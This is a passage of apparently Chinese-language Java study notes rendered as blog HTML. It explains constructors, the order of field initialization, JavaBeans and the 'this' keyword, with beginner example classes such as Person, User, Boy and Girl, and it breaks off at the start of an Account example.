title="一、构造器的作用："></a>一、构造器的作用：</h3><ol><li>创建对象</li><li>初始化对象的信息</li></ol><h3 id="二-Tip："><a href="#二-Tip：" class="headerlink" title="二.Tip："></a>二.Tip：</h3><ol><li>如果定义构造器的话，则系统默认提供一个空参的构造器。</li><li>定义构造器的格式：权限修饰符 类名(形参列表){}。</li><li>一个类中定义的多个构造器，彼此可以构成重载。</li><li>一旦我们定义了类的构造器之后，系统就不再提供默认的空参构造器。</li><li>一个类中，至少会有一个构造器。</li></ol><h4 id="三-java-代码"><a href="#三-java-代码" class="headerlink" title="三.java 代码"></a>三.java 代码</h4><p>Person 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Person类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 00:24</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">         age = <span class="number">18</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String n, <span class="type">int</span> a)</span>&#123;</span><br><span class="line">        name = n;</span><br><span class="line">        age = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a &lt; <span class="number">0</span> || a &gt; <span class="number">130</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;传入的数据非法！&quot;</span>); <span class="comment">//报红</span></span><br><span class="line">            <span class="comment">//也可以先sout然后return</span></span><br><span class="line">        &#125;</span><br><span class="line">        age = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String n)</span>&#123;</span><br><span class="line">        name = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person 类测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Person类的使用，类权限课后题</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 00:25</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        p1.setAge(<span class="number">12</span>);</span><br><span class="line">        System.out.println(p1.getName() + <span class="string">&quot;\t&quot;</span> + p1.getAge());</span><br><span class="line"></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Tom&quot;</span>, <span class="number">21</span>);</span><br><span class="line">        System.out.println(p2.getName() + <span class="string">&quot;\t&quot;</span> + p2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="属性赋值的先后顺序"><a href="#属性赋值的先后顺序" class="headerlink" title="属性赋值的先后顺序"></a>属性赋值的先后顺序</h4><ol><li>默认初始化</li><li>显式初始化</li><li>构造器中初始化</li><li>通过”对象.方法” 或 “对象.属性”的方式，赋值</li></ol><p>以上操作的先后顺序：① - ② - ③ - ④</p><h5 id="java-代码"><a href="#java-代码" class="headerlink" title="java 代码"></a>java 代码</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 属性赋值的先后顺序</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 11:33</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">u1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        System.out.println(u1.age);</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">u2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">2</span>);</span><br><span class="line">        u2.setAge(<span class="number">3</span>);</span><br><span class="line">        System.out.println(u2.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">        age = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">        age = a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="javaBean"><a href="#javaBean" class="headerlink" title="javaBean"></a>javaBean</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: JavaBean</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 11:45</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Customer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Customer</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> i)</span>&#123;</span><br><span class="line">        id = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String n)</span>&#123;</span><br><span class="line">        name = n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="this-关键字的使用"><a href="#this-关键字的使用" class="headerlink" title="this 关键字的使用"></a>this 关键字的使用</h2><ol><li>this 可以用来修饰、调用：属性、方法、构造器</li><li>this 修饰属性和方法:this 为：当前对象 或 当前正在创建的对象<ol><li>在类的方法中，我们可以使用”this.属性”或”this.方法”的方式，调用当前对象属性或方法。<br>但是，通常情况下，我们都选择省略”this.”。特殊情况下，如果方法的形参和类的属性同名时，<br>我们必须显式的使用”this.变量”的方式，表明此变量是属性，而非形参。</li><li>在类的构造器同理</li></ol></li><li>this 调用构造器<ol><li>我们在类的构造器中，可以显式的使用”this(形参列表)”方式，调用本类中指定的其他构造器</li><li>构造器中不能通过”this(形参列表)”方式调用自己</li><li>如果一个类中有 n 个构造器，则最多有 n - 1 构造器中使用了”this(形参列表)”</li><li>规定：”this(形参列表)”必须声明在当前构造器的首行</li><li>构造器内部，最多只能声明一个”this(形参列表)”，用来调用其他的构造器</li></ol></li></ol><h3 id="java-代码-1"><a href="#java-代码-1" class="headerlink" title="java 代码"></a>java 代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java2;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: this关键字</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 12:00</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        p1.setAge(<span class="number">1</span>);</span><br><span class="line">        System.out.println(p1.getAge());</span><br><span class="line"></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Tom&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        System.out.println(p2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person初始化时，需要考虑如下的1,2,3,4&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>();             <span class="comment">//Person初始化时，需要考虑如下的1,2,3,4</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(name);         <span class="comment">//这个必须放首行，每个构造器里面只能放一个this（）</span></span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eating&quot;</span>);</span><br><span class="line">        study();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;studying&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="boy-gril-测试"><a href="#boy-gril-测试" class="headerlink" title="boy,gril 测试"></a>boy,gril 测试</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer2;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Boy类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 12:55</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Boy</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Boy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Boy</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">marry</span><span class="params">(Girl girl)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我要&quot;</span> + girl.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shout</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.age &gt;= <span class="number">22</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;yes!&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;no~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer2;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Girl类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 12:55</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Girl</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Girl</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">marry</span><span class="params">(Boy boy)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我要&quot;</span> + boy.getName());</span><br><span class="line">        boy.marry(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Description</span>: 比较两个对象的大小</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Author</span>: kkx</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Date</span>: 2021/12/19</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Param</span>: [girl]</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>: 正数：当前对象大；  负数：当前对象小  ； 0：当前对象与形参对象相等</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Girl girl)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.age &gt; girl.age)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.age &lt; girl.age)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.exer2;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project11</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Boy，Girl类测试</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-19 12:55</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BoyGirlTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Boy</span> <span class="variable">boy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Boy</span>(<span class="string">&quot;阿强&quot;</span>, <span class="number">21</span>);</span><br><span class="line">        boy.shout();</span><br><span class="line">        <span class="type">Girl</span> <span class="variable">girl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Girl</span>(<span class="string">&quot;阿珍&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        girl.marry(boy);</span><br><span class="line"></span><br><span class="line">        <span class="type">Girl</span> <span class="variable">girl1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Girl</span>(<span class="string">&quot;2233&quot;</span>, <span class="number">11</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">compare</span> <span class="operator">=</span> girl.compare(girl1);</span><br><span class="line">        <span class="keyword">if</span> (compare &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(girl.getName() + <span class="string">&quot;大&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (compare &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(girl1.getName() + <span class="string">&quot;大&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;一样大&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Account-测试"><a href="#Account-测试" class="headerlink" title="Account 测试"></a>Account 测试</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 